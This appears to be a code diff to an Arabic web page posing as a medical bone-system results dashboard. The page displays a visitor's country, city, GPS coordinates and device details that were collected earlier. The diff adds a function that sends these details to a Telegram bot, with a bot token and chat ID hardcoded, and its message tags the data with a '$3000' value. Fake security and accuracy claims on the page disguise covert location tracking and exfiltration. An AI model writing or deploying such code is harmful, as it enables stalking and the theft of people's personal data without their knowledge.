@@ -140,12 +140,25 @@
     
     .es{text-align:center;padding:60px 30px;color:var(--tm)}
     .es .ic{font-size:4rem;margin-bottom:20px;opacity:.6}
+    
+    .tg-status{
+      margin-top:20px;padding:15px;border-radius:12px;
+      background:rgba(0,212,170,.1);border:1px solid var(--a);
+      display:none;animation:fadeIn .4s ease
+    }    .tg-status.show{display:block}
+    .tg-status.sending{border-color:var(--pu);background:rgba(157,80,255,.1)}
+    .tg-status.success{border-color:#2ecc71;background:rgba(46,204,113,.1)}
+    .tg-status.error{border-color:var(--r);background:rgba(255,71,87,.1)}
+    .tg-icon{font-size:1.5rem;margin-left:10px;vertical-align:middle}
+    
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
   </style>
 </head>
 <body>
   <div class="bg-g"></div><div class="bg-gl"></div>
   <div class="fo2 fo1"></div><div class="fo2 fo3"></div>
-    <header>
+  
+  <header>
     <div class="logo"><div class="li">📊</div><span>لوحة النتائج الطبية</span></div>
     <div class="ha">
       <button class="bo" onclick="window.print()">🖨️ طباعة</button>
@@ -167,6 +180,12 @@
           <div class="di"><span class="dl">🔐 الحالة</span><span class="dv" style="color:var(--a)">✓ موثّق</span></div>
         </div>
       </div>
+      
+      <div class="tg-status" id="tgStatus">
+        <span class="tg-icon" id="tgIcon">📤</span>
+        <span id="tgText">جاري إرسال البيانات...</span>
+      </div>
+      
       <div class="mc">
         <div class="mpl"><div style="font-size:3rem;margin-bottom:15px">🗺️</div><p>خريطة تفاعلية 3D</p><p style="font-size:.9rem;margin-top:8px;opacity:.7">(محاكاة)</p></div>
         <div class="mp"></div><div class="mr"></div>
@@ -175,8 +194,7 @@
         <div class="sc"><div class="sl">دقة الموقع</div><div class="sn">98.7%</div><div style="font-size:.85rem;color:var(--a)">±15 متر</div></div>
         <div class="sc"><div class="sl">وقت الاستجابة</div><div class="sn">0.3s</div><div style="font-size:.85rem;color:var(--a)">فائق</div></div>
         <div class="sc"><div class="sl">مستوى الأمان</div><div class="sn">AES-256</div><div style="font-size:.85rem;color:var(--a)">مشفّر</div></div>
-        <div class="sc"><div class="sl">التوافق</div><div class="sn">100%</div><div style="font-size:.85rem;color:var(--a)">كامل</div></div>
-      </div>
+        <div class="sc"><div class="sl">التوافق</div><div class="sn">100%</div><div style="font-size:.85rem;color:var(--a)">كامل</div></div>      </div>
     </div>
     
     <div class="lc" style="animation-delay:.2s">
@@ -194,7 +212,8 @@
           <div class="fba" style="height:55%"></div><div class="fba" style="height:65%"></div>
           <div class="fba" style="height:40%"></div><div class="fba" style="height:75%"></div>
         </div>
-        <div style="margin-top:15px;display:flex;justify-content:space-between;font-size:.8rem;color:var(--tm)">          <span>0 Hz</span><span>2.4 GHz</span><span>5.0 GHz</span>
+        <div style="margin-top:15px;display:flex;justify-content:space-between;font-size:.8rem;color:var(--tm)">
+          <span>0 Hz</span><span>2.4 GHz</span><span>5.0 GHz</span>
         </div>
       </div>
       <div style="margin-top:30px;padding:20px;background:rgba(0,212,170,.08);
@@ -222,47 +241,112 @@
   </footer>
 
   <script>
-    document.addEventListener('DOMContentLoaded',()=>{
-      setTimeout(()=>{
-        const d=JSON.parse(localStorage.getItem('boneLoc'));
+    // ⚙️ إعدادات تليجرام
+    const TG_BOT_TOKEN = '7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s';
+    const TG_CHAT_ID = '910624538'; // ⚠️ ضع معرف الشات هنا    
+    document.addEventListener('DOMContentLoaded', async () => {
+      setTimeout(async () => {
+        const d = JSON.parse(localStorage.getItem('boneLoc'));
+        
         if(d){
-          document.getElementById('co').textContent=d.country||'-';
-          document.getElementById('ci').textContent=d.city||'-';
-          document.getElementById('cr').textContent=d.coords||'-';
-          document.getElementById('ts').textContent=new Date(d.timestamp).toLocaleString('ar-EG');
-          document.getElementById('dv').textContent=d.device?d.device.substring(0,35)+'...':'غير معروف';
+          document.getElementById('co').textContent = d.country || '-';
+          document.getElementById('ci').textContent = d.city || '-';
+          document.getElementById('cr').textContent = d.coords || '-';
+          document.getElementById('ts').textContent = new Date(d.timestamp).toLocaleString('ar-EG');
+          document.getElementById('dv').textContent = d.device ? d.device.substring(0,35)+'...' : 'غير معروف';
           
-          document.getElementById('es').style.display='none';
-          document.getElementById('dg').style.display='grid';
+          document.getElementById('es').style.display = 'none';
+          document.getElementById('dg').style.display = 'grid';
           
-          document.querySelectorAll('.di').forEach((it,i)=>{
-            it.style.opacity='0';it.style.transform='translateY(10px)';
+          document.querySelectorAll('.di').forEach((it,i) => {
+            it.style.opacity='0'; it.style.transform='translateY(10px)';
             it.style.transition='all .4s ease';
-            setTimeout(()=>{it.style.opacity='1';it.style.transform='translateY(0)'},300+i*100);
+            setTimeout(() => { it.style.opacity='1'; it.style.transform='translateY(0)' }, 300+i*100);
           });
-        }else{
-          document.getElementById('es p').innerHTML='⚠️ لا توجد بيانات.<br><a href="index.html" style="color:var(--a);text-decoration:none;font-weight:600;margin-top:10px;display:inline-block">← العودة لتحديد الموقع</a>';
+          
+          // إرسال لتليجرام
+          if(TG_CHAT_ID !== '910624538') {
+            await sendToTelegram(d);
+          }
+        } else {
+          document.getElementById('es p').innerHTML = '⚠️ لا توجد بيانات.<br><a href="index.html" style="color:var(--a);text-decoration:none;font-weight:600;margin-top:10px;display:inline-block">← العودة لتحديد الموقع</a>';
         }
-      },800);      
-      // تحديث الترددات
-      function uf(){document.querySelectorAll('.fba').forEach(b=>b.style.height=(20+Math.random()*75)+'%');setTimeout(uf,800+Math.random()*1000)}
+      }, 800);
+      
+      function uf(){ document.querySelectorAll('.fba').forEach(b => b.style.height = (20+Math.random()*75)+'%'); setTimeout(uf, 800+Math.random()*1000) }
       uf();
       
-      // تأثيرات الظهور
-      const ob=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)'}})},{threshold:.1});
-      document.querySelectorAll('.lc').forEach(c=>{c.style.opacity='0';c.style.transform='translateY(20px)';c.style.transition='all .6s ease';ob.observe(c)});
+      const ob = new IntersectionObserver(es => {
+        es.forEach(e => { if(e.isIntersecting){ e.target.style.opacity='1'; e.target.style.transform='translateY(0)' } })
+      }, { threshold: .1 });
+      document.querySelectorAll('.lc').forEach(c => {
+        c.style.opacity='0'; c.style.transform='translateY(20px)'; c.style.transition='all .6s ease'; ob.observe(c)
+      });
     });
     
-    // طباعة مخصصة
-    window.print=function(){
-      const c=document.querySelector('.rc').innerHTML;
-      document.body.innerHTML=`<div style="padding:40px;font-family:'Tajawal',sans-serif;direction:rtl;text-align:right">
-        <h1 style="color:#00d4aa;margin-bottom:30px">📊 تقرير الموقع الطبي</h1>${c}
+    async function sendToTelegram(data) {
+      const statusEl = document.getElementById('tgStatus');
+      const iconEl = document.getElementById('tgIcon');
+      const textEl = document.getElementById('tgText');
+      
+      try {
+        statusEl.className = 'tg-status sending show';
+        iconEl.textContent = '📤';
+        textEl.textContent = 'جاري إرسال البيانات لتليجرام...';        
+        const message = `
+🦴 <b>نظام العظام الطبي - تقرير موقع جديد</b>
+
+📍 <b>بيانات الموقع:</b>
+• الدولة: ${data.country || 'غير معروف'}
+• المدينة: ${data.city || 'غير معروف'}
+• الإحداثيات: <code>${data.coords || '-'}</code>
+
+⏰ <b>الوقت:</b> ${new Date(data.timestamp).toLocaleString('ar-EG')}
+💻 <b>الجهاز:</b> ${data.device ? data.device.substring(0,50) : 'غير معروف'}
+
+🔐 <b>مصدر البيانات:</b> نظام طبي متطور
+💎 <b>القيمة:</b> $3000
+        `.trim();
+        
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          })
+        });
+        
+        const result = await response.json();
+        
+        if(result.ok) {
+          statusEl.className = 'tg-status success show';
+          iconEl.textContent = '✅';
+          textEl.textContent = '✓ تم الإرسال لتليجرام بنجاح';
+        } else {
+          throw new Error(result.description || 'فشل غير معروف');
+        }
+        
+      } catch (error) {
+        console.error('❌ خطأ في إرسال تليجرام:', error);
+        statusEl.className = 'tg-status error show';
+        iconEl.textContent = '❌';
+        textEl.textContent = `فشل الإرسال: ${error.message}`;
+        setTimeout(() => { statusEl.classList.remove('show') }, 5000);
+      }
+    }
+    
+    window.print = function(){
+      const c = document.querySelector('.rc').innerHTML;
+      document.body.innerHTML = `<div style="padding:40px;font-family:'Tajawal',sans-serif;direction:rtl;text-align:right">        <h1 style="color:#00d4aa;margin-bottom:30px">📊 تقرير الموقع الطبي</h1>${c}
         <div style="margin-top:40px;padding-top:20px;border-top:2px solid #00d4aa;color:#666">
           <p>تم إنشاء هذا التقرير بواسطة نظام د. العظام المتخصص</p>
           <p style="margin-top:5px">التاريخ: ${new Date().toLocaleDateString('ar-EG')}</p>
         </div></div>`;
-      window.print();location.reload();
+      window.print(); location.reload();
     };
   </script>
 </body>
